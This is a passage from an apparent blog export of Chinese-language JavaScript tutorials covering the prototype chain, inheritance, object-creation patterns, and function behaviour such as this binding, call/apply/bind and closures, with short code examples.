&#125;;&#125;People.prototype = &#123; constructor: People, sayHello: function () &#123; console.log("父的原型对象中的sayHello方法：name: " + this.name + ", age: " + this.age + ", sex: " + this.sex + ", HelloWorld !!!"); &#125;&#125;;function Boy(name, age, sex, studyNumber) &#123; // 子类中保存了父类的原型对象 // 借用构造函数实现继承 Boy.superClass.constructor.call(this, name, age, sex); this.studyNumber = studyNumber;&#125;myExtend(Boy, People);function myExtend(subConstructor, supConstructor) &#123; // 1. 用一个空函数进行中转 var F = new Function(); // 2. 保存父的原型对象 F.prototype = supConstructor.prototype; // 3. 实现经典继承 subConstructor.prototype = new F(); // 4. 还原子构造函数原型对象的构造器 subConstructor.prototype.constructor = subConstructor; // 5. 保存父的原型对象，一方面方便解耦，另一方面可以轻松获得原型对象（添加静态方法） subConstructor.superClass = supConstructor.prototype; // 6. 判断父类型的原型对象构造器，加保险 if (supConstructor.prototype.constructor !== supConstructor) &#123; supConstructor.prototype.constructor = supConstructor; &#125;&#125;// 7. 利用保存的父类原型对象实现父类子类有重载的方法Boy.prototype = &#123; constructor: Boy, sayHello: function () &#123; console.log("子的原型对象中的sayHello方法"); &#125;&#125;;// 注意： 子类的原型对象上添加方法必须在实现继承之后var boy = new Boy("Ping", 22, true, 345234);console.log("================ 八、 解决混合继承的缺点，封装函数 ExtJs 底层 白贺翔 ===================");boy.sayHello(); // 父的构造函数上的静态sayHello方法 运行Boy.prototype.sayHello(); // 子的原型对象中的sayHello方法Boy.superClass.sayHello.call(boy); // 父的原型对象中的sayHello方法：name: Ping, age: 22, sex: true, HelloWorld !!!]]></content>
      <categories>
        <category>原型链系列</category>
      </categories>
      <tags>
        <tag>原型链，继承</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[原型链]]></title>
    <url>%2F2015%2F08%2F08%2F%E5%8E%9F%E5%9E%8B%E9%93%BE%2F</url>
    <content type="text"><![CDATA[原型对象原型对象：构造函数的prototype属性：随着实例化的次数增加，不同的对象他们拥有的say方法指向不同的内存，能相同，造成了内存的浪费,为了解决内存，将这个方法放在某个对象（原型对象）中. 结论1：给构造函数的prototype属性（对象）添加一个方法，这个方法就可以被构造函数的实例所共享推论1：构造函数的prototype属性(对象)上面的属性、方法都可以被构造函数的实例所共享推论2：Student.prototype.constructor===s1.constructor结论2：构造函数的实例有一个proto指向的是构造函数的prototype属性(原型对象) s1.proto===Student.prototype (1). 原型对象是构造函数的prototype属性(2). 构造函数的实例的proto属性指向原型对象(3). 原型对象有一个constructor属性指向构造函数本身 对象的属性的读取与设置 查找一个对象上的是否存在某个属性的过程 (1). 查找当前对象(s1)的内存中是否定义了该属性，找到就停止查找(2). 去当前对象的proto属性（原型对象）中去查找是否定义了该属性，找到就停止查找(3). 如果2中没找到，就去原型对象的原型对象中去查找是否定义了该属性(4). s1.__proto__.__proto__……(N). 找到某个对象（是没有原型对象的：没有proto属性），如果这个对象中还没有，确定了无法获取该属性 基本概念JavaScript 的对象组成，一个对象就有它的原型对象(__proto__)，原型对象也有它的原型对象，一直到原型链的顶端，这样构成了一个具有链条形状的结构，称之为原型链 __proto__该属性可以被修改，但是无法被删除 对象字面量的原型链 构造函数创建对象的原型链 数组对象的原型链 一般来说，无论是对象字面量，还是构造函数创建的对象、内置对象，基本包装了类型的对象，2次原型查找（.proto）就可以找到 函数的原型链123function f()&#123;&#125;f();//f当成了普通函数来调用new f();//f当成了构造函数来调用 一些结论： 几乎所有函数都有prototype属性（Function.prototype这个函数上没有） 所有对象中都有proto属性（Object.prototype该属性的值null） —&gt; 几乎所有函数都有prototype/__proto__属性 函数都是Function的实例（函数是通过Function创建出来的对象） ——&gt; 自定义函数、Function、Array、RegExp、String、Boolean、Number、Object 几乎所有函数都是继承自：Function.prototype（除了Function.prototype） ——&gt; 函数.__proto__ === Function.prototype ——&gt; Object.__proto__ === Function.prototype ——&gt; Function.__proto__ === Function.prototype Function.prototype.__proto__ === Object.prototype String.prototype.__proto__ === Object.prototype Array.prototype.__proto__ === Object.prototype Boolean.prototype.__proto__ === Object.prototype Number.prototype.__proto__ === Object.prototype RegExp.prototype.__proto__ === Object.prototype 练习 12345678function fn()&#123;&#125;1、console.log(fn.constructor===Function);//true //查找fn的内存——&gt;查找fn.__proto__(Function.prototype)——&gt;Function2、console.log(fn.__proto__===_______);//true //Function.prototype3、console.log(Object.__proto__===______);//true //Function.prototype4、console.log(Function.prototype===______);//true //Function.__proto__——&gt;fn.__proto__——&gt;Object.__proto__5、console.log(Object.constructor); //Function6、console.log(fn.prototype.constructor); //fn7、console.log(Function.prototype.__proto__.constructor); //Object 原型链完整图]]></content>
      <categories>
        <category>原型链系列</category>
      </categories>
      <tags>
        <tag>面向对象，原型链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js String对象]]></title>
    <url>%2F2015%2F07%2F18%2F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[面向对象的语言的标志就是它们有类的概念，通过类可以创建任意多个具有相同属性和方法的对象。JavaScript 中的类的实现是基于其原型继承机制。如果两个实例都从同一个原型对象上继承了属性，就认为是同一个类的实例。 JavaScript 的对象是属性名以及与之对应的值的基本集合。集合是一种数据结构，泳衣表示非重复值的无序集合。 理解对象JavaScript 是一门基于对象的多泛式语言。可以使用面向过程进行开发： 获取元素，绑定事件、设置样式、完成动画。。。。。。 可以使用面向对象的方式进行开发： 面向（关注于）过程：基于函数，封装函数 面向对象：关注点变成了对象 对象的概念：数据集，功能集： 无序属性的集合，包含基本值，对象或者函数。 1234567891011121314151617181920//CEO：安排一个任务给CTO(7天)，CTO又把任务给PM(5天)，PM又把任务给我了(3天)，我去开发这个页面var ceo = &#123; assignTaskToCTO: function () &#123; console.log("安排一个任务给CTO"); &#125;&#125;;var cto = &#123; assignTaskToPM: function () &#123; console.log("安排一个任务给PM");&#125;&#125;;var pm = &#123; assignTaskToMe: function () &#123; console.log("安排一个任务给我"); &#125;&#125;;var me = &#123; developWeb:function()&#123; console.log("我去开发这个页面"); &#125;&#125;;//开发一个页面function deleveWeb()&#123; ceo.assignTaskToCTO(); cto.assignTaskToPM(); pm.assignTaskToMe(); me.developWeb();&#125; 一个例子： 利用构造函数来定义 “范围类” 1234567891011121314151617181920212223 // 构造函数初始化function Range(from, to) &#123; // 存储起始位置和结束位置 this.from = from; this.to = to;&#125;Range.prototype = &#123; // constructor: Range, // 如果 x 在范围内，返回 true，否则返回 false // 这个方法可以比较数字范围，也可以比较字符串和日期范围 includes: function(x) &#123; return this.from &lt;= x &amp;&amp; x &lt;= this.to&#125;, // 对于范围内的每一个整数调用函数 f foreach: function(f) &#123; for (var x = Math.ceil(this.from); x &lt;= this.to; x++) f(x); &#125;, // 返回表示这个范围的字符串 toString: function() &#123; return "(" + this.from + "..." + this.to + ")"; &#125;&#125;;// 举例var r = new Range(3, 5); console.log(r.includes(4)); // truer.foreach(console.log); // 3, 4, 5console.log(r); // Range&#123;from:3, to:5&#125; 构造函数和类的标识当且仅当两个对象继承自同一个原型对象时，它们才是属于同一个类的实例。初始化对象的状态的构造函数不能作为类的标识，两个构造函数的 prototype 属性可能指向同一个原型对象。那么这连个构造函数的实例是属于同一类型的。 可以使用r instanceof Range来判断一个实例是否继承自 Range.prototype。 constructor 属性每一个 JavaScript 函数都自动拥有一个 prototype 属性，这个属性指向一个对象即称作原型对象，这个对象包含唯一一个不可枚举的属性 constructor。 constructor 的值是一个函数对象。 构造函数的原型中存在预先定义好的 constructor 属性，这意味着通常继承的 constructor 均指代它们的构造函数。 在上面定义的 Range 构造函数的原型由于被另一个对象替换了，所以重写了预定义的 Range.prototype 对象。 Range 的实例的 constructor 没有继承自 Range.prototype 的 constructor 属性。其值变成了 Object。 创建对象的几种方式 使用 Object 构造函数或对象字面量都可以用来创建单个对象，但这些方式有个明显的缺点： 使用一个接口创建很多对象会产生大量的重复代码。 工厂模式12345678910111213141516// 创建一个包含所有必要信息的 Person 对象// 可以无数次的调用这个函数，而且每次都会返回一个包含三个属性的方法的对象function createPerson(name, age, job) &#123; var o = new Object(); o.name = name; o.age = age; o.job = job; o.sayName = function() &#123; console.log(this.name); &#125; return o;&#125;var p1 = createPerson("Hiraku", 23, "JavaScript Engineer");var p2 = createPerson("Wang", 22, "Java Engineer");p1.sayName();p2.sayName(); 问题： 并没有解决对象识别的问题（即怎样知道一个对象的类型）。 构造函数模式123456789101112function Person(name, age, job) &#123; this.name = name; this.age = age; this.job = job; this.sayName = function() &#123; console.log(this.name); &#125;;&#125;var p1 = new Person("Hiraku", 23, "JavaScript Engineer");var p2 = new Person("Wang", 22, "Java Engineer");p1.sayName();p2.sayName(); 和工厂模式的区别： 没有显式的创建对象； 直接将属性和方法赋值给了 this 对象 没有 return 语句 使用 new 关键字创建对象的实例 将构造函数的作用域赋值给新对象（因此 this 就指向了这个对象） 返回新对象 p1 和 p2 有继承自 Person.prototype 的属性 constructor，该属性指向 Person 使用构造函数模式的缺点：每个方法都要在每个实例上创建一遍。如 p1 和 p2 都有一个名为 sayName() 方法，但是两个方法不是同一个 Function 的实例。创建两个完成相同任务的 Function 实例没有必要，这样会浪费内存。 原型模式原型对象的用途是包含可以由特定类型的所有实例共享的属性和方法。 123456789function Person() &#123;&#125;Person.prototype.name = "Hiraku";Person.prototype.age = 22;Person.prototype.job = "JavaScript Engineer";Person.prototype.sayName = function() &#123; console.log(this.name);&#125;var p1 = new Person();p1.sayName(); 好处：可以让所有对象实例共享它所包含的属性和方法。 当给对象的实例添加一个属性时，这个属性会屏蔽原型对象中保存的同名属性。 更简单的原型语法123456789function Person()&#123;&#125;Person.prototype = &#123; name: "Hiraku", age: 23, job: "JavaScript Engineer", sayName: function() &#123; console.log(this.name); &#125;&#125;; 这时 constructor 属性不再指向 Person 了，constructor 变成了新对象的 constructor，是 Object 构造函数。 这时，需要还原构造器 12345678910function Person()&#123;&#125;Person.prototype = &#123; constructor: Person, name: "Hiraku", age: 23, job: "JavaScript Engineer", sayName: function() &#123; console.log(this.name); &#125;&#125;; 注： 以上方式重置 constructor 属性会导致它的 [[enumerable]] 特性被设置为 true。 默认情况下，原生的 constructor 属性是不可枚举的，因此，可以使用 ECMAScript5 中的 Object.defineProperty() 方法来设置。 1234Object.defineProperty(Person.prototype, "constructor", &#123; enumerable: false, value: Person&#125;); 原型的动态特性123456789function Person() &#123;&#125;var friend = new Person();Person.prototype = &#123; name: &quot;Hiraku&quot;, sayName: function() &#123; console.log(this.name); &#125;&#125;friend.sayName(); // 报错 原因是重写了原型对象，把原型对象修改为另一个对象就等于切断了构造函数与最初原型之间的联系。 实例中的指针仅仅指向原型，而不指向构造函数。 原生的对象原型原型模式不仅仅体现在创建自定义类型放没放，就连所有原生的引用类型，都采用这种模式创建的。所有原生原生引用类型都在其构造函数的原型上定义了方法。 通过原生原型对象，不仅可以取得默认方法的引用，而且还可以定义新方法。可以像修改自定义对象的原型一样修改原生对象的原型，因此可以随时添加方法。 但是，不建议在编程时修改原生对象的原型。 原型模式的缺点省略了构造函数初始化，所有实例默认情况下都将取得相同的属性值。还有，原型模式的最大问题是由其共享的本性所导致。 组合使用构造函数模式和原型模式123456789101112131415161718192021function Person(name, age, job) &#123; this.name = name; this.age = age; this.job = job; this.friends = ["Herschal", "Camile"];&#125;Person.prototype = &#123; constructor: Person, sayName: function() &#123; console.log(this.name); &#125;&#125;var p1 = new Person("Hiraku", 23, "JavaScript Engineer");var p2 = new Person("Wang", 22, "Java Engineer");p1.friends.push("Van");console.log(p1.friends); // "Herschal, Camile, Van"console.log(p2.friends); // "Herschal, Camile"console.log(p1.friends === p2.friends); // falseconsole.log(p1.sayName === p2.sayName); // truep1.sayName();p2.sayName(); 这种方式是使用最广泛的。 动态原型模式12345678910111213function Person(name, age, job) &#123; this.name = name; this.age = age; this.job = job; this.friends = ["Herschal", "Camile"]; if (typeof this.sayName != "function") &#123; Person.prototype.sayName = function() &#123; console.log(this.name); &#125;; &#125;&#125;var p1 = new Person("Hiraku", 23, "JavaScript Engineer");p1.sayName(); 这里在对原型做的修改，能立即在所有实例中得到反映。 寄生构造函数模式基本思路是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回创建的对象。 123456789101112function Person(name, age, job) &#123; var o = new Object(); o.name = name; o.age = age; o.job = job; o.sayName = function() &#123; console.log(this.name); &#125;; return o;&#125;var p1 = new Person("Hiraku", 23, "JavaScript Engineer");p1.sayName(); 关于寄生构造模式，首先，返回对象与构造函数或者构造函数的原型属性之间没有关系。也就是说，构造函数返回到对象与在构造函数外部创建的对象没有什么不同。不能依赖 instanceof 操作符来确定对象的类型。 稳妥构造函数模式首先介绍稳妥对象，稳妥对象是指没有公共属性，而且其它方法也不引用 this 的对象。稳妥模式适合在一些安全的环境中，或者在防止数据被其它应用程序改动时使用。稳妥模式遵循寄生模式，但有两点不同。 新创建对象的实例方法不引用 this； 不使用 new 操作符来调用构造函数。 123456789function Person(name, age, job) &#123; var o = new Object(); o.sayName = function() &#123; console.log(name); &#125;; return o;&#125;var p1 = Person("Hiraku", 23, "JavaScript Engineer");p1.sayName();]]></content>
      <categories>
        <category>面向对象系列</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>面向对象</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js String对象]]></title>
    <url>%2F2015%2F07%2F06%2Fjs%E7%9A%84%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[js 高程中这样定义函数：函数是这样一段 JavaScript 代码，只定义一次，但可以被执行任意多次。JavaScript 的函数是参数化的：函数的定义会包括一个称为形参和标识符列表，这些参数在函数体中就像局部变量一样工作。函数的调用会为形参提供实参的值。函数使用它们实参的值来计算返回值，成为该函数调用表达式的值。出来实参之外，每次调用还会拥有另一个值-本次调用的上下文-这就是 this 关键字的值。 如果函数挂载在一个对象上，作为对象的一个方法调用，就称之为 对象的方法。当通过这个对象来调用函数时，该对象就是此次调用的上下文，也就是该函数的 this 的值。 用于初始化一个新建的对象的函数成为构造函数。 在 JavaScript 里，函数即对象。可以把函数赋值给变量，或者作为参数传递给其他函数。 JavaScript 的函数可以嵌套在其他函数中定义，这样就可以访问它们被定义时所处的作用域中的任何变量。这意味着 JavaScript 函数构成了一个闭包。 函数的定义函数定义方式一： 函数声明123function funcName(arg0, arg1, ...)&#123; // 函数体&#125; 函数的组成： function 关键字 函数名标识符：是函数声明语句的必要组成 一对圆括号：其中包含有 0 个或多个逗号分隔的标识符组成的列表，表示函数的参数 一对花括号 函数的定义方式二： 函数表达式123456var functionName = function(arg0, arg1, ...) &#123; //函数体&#125; var functionName = function foo(arg0, arg1, ...) &#123; //函数体&#125; 以函数表达式定义的函数，函数名称是可选的。一条语句实际上声明了一个变量，并把一个函数对象赋值给它。函数表达式定义函数通常不加函数名，图特别适合仅调用一次的函数。 函数的嵌套1234function hypotenuse(a, b) &#123; function square(x) &#123; return x * x; &#125; return Math.sqrt(square(a) + square(b));&#125; 函数调用、this指向、返回值一个函数最终产生什么样的结构，跟如何调用这个函数息息相关：函数的四种调用模式 函数的4种调用模式 第一种模式：函数调用模式，也就是写一个函数，然后调用一下 第二种模式：方法调用模式，也就是将函数成为对象的一个方法，然后通过对象来调用 第三种模式：构造函数调用模式，也就是将函数当成构造函数来调用 第四种调用模式：上下文调用模式，根据调用方式的不同可以产生不同的结果 第四种函数调用的实现方式 实现方式：call/apply (apply 和 call 的唯一区别是第二个参数是数组，将实参值一一传到数组中。fn.call (函数内部的 this 的值,实参1，实参2…)) 不同调用模式中的this的值 函数调用模式中 this 指向：window 方法调用模式中 this 指向：调用的对象 构造函数调用模式中 this 指向：构造函数的实例 上下文调用模式中 this 指向： (1) 如果 call 方法的第一个参数是一个对象，则 fn 函数内部的 this 的值指向该对象 (2) 如果 call 方法的第一个参数是一个字符串、数字、布尔值，则 fn 函数内部的 this 的值会转换为该类型所对应的基本包装类型的对象 (3) 如果 call 方法的第一个参数是 null ，则 fn 函数内部的 this 的值是 window ——&gt; 就相当于是一次函数调用模式 调用模式中的返回值 函数调用模式中返回值：由 return 语句决定 方法调用模式中返回值：由 return 语句决定 构造函数调用模式中的返回值： (1). 如果构造函数没有手动设置返回值，那么会返回构造函数的实例 (2). 如果手动给构造函数添加了返回值，有以下2种情况： (a). 返回值是值类型：最终的返回值还是构造函数的实例 (b). 返回值是引用类型(对象)：最终的返回值就是该对象 上下文调用模式中的返回值：由 return 语句决定 函数的实参和形参函数的可选形参当调用函数的时候传入的实参比函数声明时指定的形参个数要少，剩下的形参都将设置为 undefined 值。 12345678function getPropertyName(o, /*可选的*/ a) &#123; if (a === undefined) a = []; // 如果未定义，赋值一个新数组 // 上面这句代码可以替换成 a = a || []; // 这才是习惯写法 for (var property in a) a.push(property); return a;&#125;var a = getPropertyName(o);getPropertyNames(o, p); // 将 ｐ 的属性追加到数组 a 中 注意： 需要定义可选的实参来实现函数时，需要将可选的实参放在实参列表的最后。 可变长的实参列表、实参对象当调用函数时传入的实参个数超过函数定义时的形参个数时，没有办法直接获得未命名值的引用。函数的参数对象解决了这个问题。 在函数体内部， 标识符 arguments 指向实参对象的引用，实参对象包含一个 length 属性，是一个伪数组。、 实参的重要用途是可以操作任意数量的实参。 在非严格模式下，当一个函数包含若干个形参，实参对象的数组元素是函数形参所对应实参的别名，实参对象中以数字索引，并且形参名称可以认为是相同变量的不同命名。 严格模式下，arguments 对象变成了一个保留字，不能给其赋值，也不能使用 arguments 作为形参名或者局部变量名，也不能给 arguments 赋值。 callee 和 caller 属性callee 指向当前正在执行的函数。 caller 是非标准的，但大多数函数实现了这个属性。指的是调用当前正在执行的函数的函数。 将对象的属性作为实参JavaScript 中，可以通过 键/值 对的形式来传入参数，这样当一个函数中的参数有很多的时候，不需要记住传入的顺序。 这种风格调用的函数，传入的实参都写进一个单独的对象中，在调用的时候传入一个对象，对象中的 键/值对是真正需要的实参数据。如： 12345678910111213141516171819// 将原始数组中的 length 元素复制到目标数组中function arraycopy(/* array */ from, /* index */ form_start, /* array */ to, /* index */ to_start, /* integer */ length)&#123; // 代码段&#125;;// 这种方式效率较低，但不必记住参数顺序function easycopy(args) &#123; arraycopy(args.from, args.from_start || 0, args.to, args.to_start || 0, args.length );&#125;// 调用 easycopy 方法var a = [1, 2, 3, 4], b = [];easycopy(&#123;from: a, to: b, length: 4&#125;); 可以使用以上这种代码来适当使用文档说明自己的函数的参数 实参类型JavaScript 方法的形参并未声明类型，在形参传入函数之前没有做任何类型检测。在定义函数的时候，需要添加类型判断。 123456789101112131415161718192021222324252627function isArrayLike(o) &#123; if (o &amp;&amp; typeof o === "object" &amp;&amp; isFinite(o.length) &amp;&amp; o.length &gt;=0 &amp;&amp; o.length === Math.floor(o.length) &amp;&amp; o.length &lt; 4294967296) return true; else return false;&#125;function sum(a) &#123; var total = 0; for(var i = 0; i &lt; argument.length; i++) &#123; var element = arguments[i], n; if (element == null) continue; // 忽略 null 和 undefined 实参 if (isArray(element)) // 如果实参是数组 n = sum.apply(this, element); // 递归地计算累加... else if (typeof element === 'function') // 是函数 n = Number(element()); // 调用并做类型转换 else n = Number(element); // 否则直接做类型转换 if (isNaN(n)) // 如果无法转换为数字，抛出异常 throw Error("sum(): can't convert " + element + " to number"); total += n; &#125; return total;&#125; 作为值的函数JavaScript 中的函数不仅仅是一种语法，也是值，可以将函数赋值给变量，也可以存储在对象的属性或数组的元素中，还可以作为参数传入另外一个函数等。 比如： 12var a = [function(x) &#123; return x*x;&#125;, 20];console.log(a[0](a[2])); // =&gt; 400 自定义函数的属性JavaScript 中的函数并不是原始值，而是一个种特殊的对象，也就是说，函数可以拥有属性。当函数需要一个”静态” 变量来在调用时保持某个值不变，最方便的方式就是给函数定义属性，而不是定义全局变量。 1234uniquInteger.counter = 0;function uniquInteger() &#123; return uniquInteger.counter++; &#125; 计算阶乘的函数： 123456789function factorial(n) &#123; if (isFinite(n) &amp;&amp; n &gt; 0 &amp;&amp; n == Math.round(n)) &#123; // 有限的正整数 if (!(n in factorial)) factorial[n] = n * factorial(n-1); return factorial[n]; &#125; else return NaN;&#125;console.log(factorial[1]); // 初始化 作为命名空间的函数命名空间内定义的变量不会污染全局变量，这就解决环境中变量冲突问题。 123(function() &#123; // 模块代码段&#125;)(); 一个例子： 123456789101112131415161718192021222324252627282930313233// 定义一个用来将第二个以及后续参数复制至第一个参数// 如果 o 的属性拥有了一个不可枚举的同名属性，则 for/in 循环// 不会枚举对象 o 的可枚举属性var extend = (function()&#123; // 在修复之前，先检测 bug 是否存在 for (var p in &#123;toString: null&#125;) &#123; return function extend(o) &#123; // 代码执行到这里，for/in 循环会正确工作并返回 for (var i = 1; i &lt; arguments.length; i++) &#123; var source = arguments[i]; for (var prop in source) o[prop] = source[prop]; &#125; return o; &#125;; &#125; // 代码执行到这里，说明 for/in 不会枚举测试对象的 toString 属性 // 如果返回的另一个版本的 extend() 函数，这个函数是显式测试 Object.prototype中的不可枚举属性 return function patched_extend(o) &#123; for (var i =1; i &lt; arguments.length; i++) &#123; var source = arguments[i]; for (var prop in source) o[prop] = source[prop]; for (var j = 0; j &lt; protoprops.length; i++) &#123; prop = protoprops[j]; if (source.hasOwnProperty(prop)) o[prop] = source[prop]; &#125; &#125; return o; &#125;; // 列出了需要检测的特殊属性 var protoprops = ["toString", "valueOf", "constructor", "hasOwnProperty", "isPrototypeOf", "propertyIsEnumerable", "toLocaleString" ];&#125;()); js 词法分析程序执行过程 读取代码，主关注声明的部分：var 判断var后面的名字是否已经被标记，如果没有被标记过，就标记 读取完毕后，代码从上往下，从左往右依次执行 词法作用域（作用域：变量可以使用到不能使用的范围） 词法作用域就是描述变量的访问范围： 在代码中只有函数可以限定作用范围，允许函数访问外部的变量 在函数内优先访问内部声明的变量，如果没有才会访问外部的 所有变量的访问规则，按照预解析规则来访问 作用域链： 每一个函数具有独立作用域，由于函数内可以套函数，所以在函数内部访问变量的时候，需要一级一级的往上查找该变量，这样就好像构成了一个链式结构，把它称之为作用域链。 严格模式开启严格模式：”use strict”; 严格模式中禁止给一个未声明的变量赋值： 严格模式中eval具有了独立作用域——&gt;在eval中声明的变量和函数都是局部变量 严格模式中禁止使用arguments.callee进行递归调用 闭包JavaScript 函数的执行依赖于变量作用域，这个作用域在函数定义时决定的，而不是函数调用的时候决定的。为了实现这种词法作用域, JavaScript 函数对象的内部状态不仅仅包含函数的代码逻辑，还必须引用当前的作用域， JavaScript 函数对象的内部状态不仅包含函数代码逻辑，还必须引用当前的作用域链。函数对象可以通过作用域链相互关联起来，函数体内部的变量都可以保存在函数作用域内，这种特性称闭包。 函数定义时的定义作用域链到函数执行时依然有效。 12345678910111213141516// 利用闭包实现的私有属性存取器方法function addPrivateProperty (o, name, predicate) &#123; var value; o["get" + name] = function() &#123; return value; &#125;; o["set" + name] = function(v) &#123; if (predicate &amp;&amp; !predicate(v)) throw Error("set" + name + ": invalid value " + v); else value = v; &#125;;&#125;var o = &#123;&#125;;addPrivateProperty(o, "Name", function(x) &#123; return typeof x == "string"&#125;);o.setName("Hiraku"); // 设置属性值console.log(o.getName); // 获取属性值o.setName(0); // 试图设置一个错误的值 闭包的一个应用: 模块化 1234567891011121314151617181920//面向对象——&gt;模块化var SongManager2=(function()&#123; function f1()&#123;&#125; function f2()&#123;&#125; function f3()&#123;&#125; //构造函数 function SongManager()&#123;&#125; SongManager.prototype=&#123; //原型对象 init:function()&#123; f1(); f2(); f3();//这3个功能：如果业务逻辑非常复杂，需要把这些方法拆分掉， // 并且这些方法不能让用户随便调用，用一些函数封装一下 &#125;, //原型对象中的方法对于子对象是完全公开的，对象可以随意调用 init1:function()&#123;&#125;, init2:function()&#123;&#125; &#125;; return SongManager;&#125;()); 闭包实现思路：外层函数，内层函数 通常设置外层函数的返回值就是内层函数 也可以让外层函数的返回值是一个对象（方法) 如果需要保存一个数据(外层函数的同一个变量)，让内层函数调用多次，该变量的值都是共享的 如果需要保存多个数据(外层函数的同一个变量)，让外层函数调用多次 函数的属性、方法和构造函数JavaScript 中的函数是值， 使用 typeof 方法得到的结果是 “function”，但是函数是 JavaScript 中的特殊的对象，也可以拥有属性和方法。甚至可以用 Function()构造函数来创建新的函数对象。 length 属性在函数体里， arguments.length 表示传入函数的实参的个数。而函数本事的 length 属性是只读的，它代表函数形参数量，即函数定义时时给出的实参个数，通常也是函数在调用时期望传入的个数。 123456789101112// 判断所传入的实参个数是否正确// 该函数使用 arguments.callee 不能在严格模式下调用function check(args) &#123; var actual = args.length; var expected = args.callee.length; if (actural !== expected) throw Error("Expected " + expected + "args; got " + actual);&#125;function f(x, y, z) &#123; check(arguments); return x + y + z;&#125; prototype 属性每一个函数都包含一个 prototype 属性，该属性指向一个对象的引用，这个对象称为原型对象。下一篇文章将深入分析。 call() 方法和 apply() 方法call() 和 apply() 的第一个实参是要调用函数的母体对象，它是调用上下文，在函数体内通过 this 来获得对它的引用。 在严格模式中，call() 和 apply() 的第一个实参都会变成 this 的值，哪怕传入的是 null 或 undefined。在严格模式下，传入 null 或 undefined 的时候都会被全局对象代替。 call/apply区别 相同点： (1) 都是Function.prototype对象中定义的方法 (2) 第一个参数都是表示函数内部的this的值 不同点： 如果需要给函数传递参数的时候: 利用call方法，将函数的参数从第二个参数开始依次排开 apply方法的第二个参数是一个数组对象，数组的第一个参数表示函数的第一个实参，依次以此类推 apply的一个漂亮的应用1234 var points = [ &#123; x: 110, y: 50&#125;, &#123; x: 130, y: 60 &#125;, &#123; x: 20, y: 70 &#125;, &#123; x: 60, y: 50 &#125; ];var maxX = Math.max.apply( null, points.map(function (v) &#123; return v.x; &#125;)); 以上代码中借用Math对的max方法，利用arr.map()方法中返回的是数组这一特性得到了数组中对象的某个属性的最大值。 将当前函数的 arguments 数组直接传入 apply() 来调用另一个函数1234567891011// 将对象 o 中的方法替换为另一个方法// 可以在调用原始方法之前和之后记录日志消息function trace(o, m) &#123; var original = o[m]; // 在闭包中保存原有方法 o[m] = function () &#123; // 定义新方法 console.log(new Date(), "Entering:", m); // 输出日志消息 var result = original.apply(this, arguments); // 调用原始函数 console.log(new Date(), "Exiting:", m); // 输出日志消息 return result; // 返回结果 &#125;;&#125; trace 方法接收两个参数，一个对象和一个方法名，它将制定的方法替换为一个新的方法。 bind() 方法bind() 方法在 Function 的原型对象上 bind 方法是 ECMAScript 5 的新方法，用途是将函数绑定到某个对象。当函数 f() 上调用 bind 方法并传入一个对象 o 作为参数，这个方法返回一个新的对象。 1234function f(y) &#123; return this.x + y; &#125;; var o = &#123;x: 1&#125;;var g = f.bind(o);console.log(g(2)); // 3 bind() 简单绑定 1234567// 返回一个函数，通过调用它来调用 o 中的方法 f(), 传递它所有的实参function bind(f, o) &#123; if (f.bind) return f.bind(o); else return function() &#123; return f.apply(o, arguments); &#125;&#125; ECMAScript 5 的 bind() 方法不仅仅是将函数绑定到一个对象，它还可以附带一些其它应用：除了第一个参数外，传入 bind() 的实参也会绑定到 this。 12345678var sum = function(x, y) &#123; return x + y; &#125;;// 创建一个类似 sum 的函数，但 this 的值绑定到 null// 并且第一个参数绑定到 1，这个新的函数期望只传入一个实参var succ = sum.bind(null, 1);console.log(succ(2)); // 3: x 绑定到 1， 并传入 2 作为实参 yfunction f(y,z) &#123; return this.x + y + z &#125;;var g = f.bind(&#123;x:1&#125;, 2);console.log(g(3)); // 6: this.x 绑定到 1，y 绑定到 2， z 绑定到 3 bind() 的兼容方法123456789101112if (!Function.prototype.bind) &#123; Function.prototype.bind = function (o /*, args*/) &#123; // 将 this 和 arguments 的值保存到变量中 var self = this, boundArgs = arguments; return function() &#123; var args = [], i; for (i = 1; i &lt; boundArgs.length; i++) args.push(boundArgs[i]); for (i = 1; i &lt; arguments.length; i++) args.push(arguments[i]); return self.apply(o, args); &#125;; &#125;;&#125; ECMAScript 5 的 bind() 方法返回的函数不包含 prototype 属性，并且将这些绑定的函数用作构造函数时所创建的对象从原始的未绑定的构造函数中继承 prototype 。 toString() 方法函数也有 toString() 方法，大多数函数的 toString() 方法返回包含函数体本身的字符串。 静态属性和实例属性 给函数添加一个属性（静态属性——&gt;函数对象自身的属性） 给某个构造函数的实例添加的属性：实例属性 所有的函数对象都共有的一些静态属性 name：获取函数的名称 length：表示函数形参的个数 caller：表示当前函数调用是在哪个函数内 Function() 构造函数Function() 构造函数可以传入任意数量的字符串实参，最后一个实参所表示的文本就是函数体，它可以包含任意的 JavaScript 语句，每两条语句之间用分号分隔。传入构造函数的其它所有字符串是指定函数的形参名字的字符串。如果定义的函数不包含任何参数，只需要给构造函数简单的传入一个字符串，即函数体。 注： Function() 构造函数并不需要通过传入实参以指定函数名。就像函数的直接量一样，Function() 构造函数创建一个匿名函数。 Function() 构造函数允许 JavaScript 在运行时动态地创建并编译函数 每次调用 Function() 构造函数都会解析函数体，并创建函数对象 Function() 构造函数创建的函数并不使用词法作用域，函数体代码的编译总是会在顶层函数执行。 1234567var scope = "global";function constructFunction() &#123; var scope = "local"; return new Function("return scope"); // 这里无法使用局部作用域的变量&#125;// 通过 Function() 构造函数定义的函数使用的不是局部作用域console.log(constructFunction()()); // "golobal" 可以认为 Function() 构造函数是在全局作用域中执行的 eval(); eval() 可以在自己的私有作用域内定义新变量和函数。 Function() 很少用到。 可调用的对象类似于 所有的”伪数组”，对于函数也存在类似的情况。”可调用对象” 是一个对象，可以在函数调用表达式中调用这个对象。所有的函数都是可调用的，但并非所有的可调用对象都是函数。 可调用对象在两个 JavaScript 实现中不能算作函数。首先，IE Web 浏览器实现了客户端方法，比如 Window.alert(), Document.getElementById(), 使用了可调用的宿主对象，而不是内置函数对象。 另一个可调用对象是 RegExp 对象，可以直接调用 RegExp 对象，这比调用它的 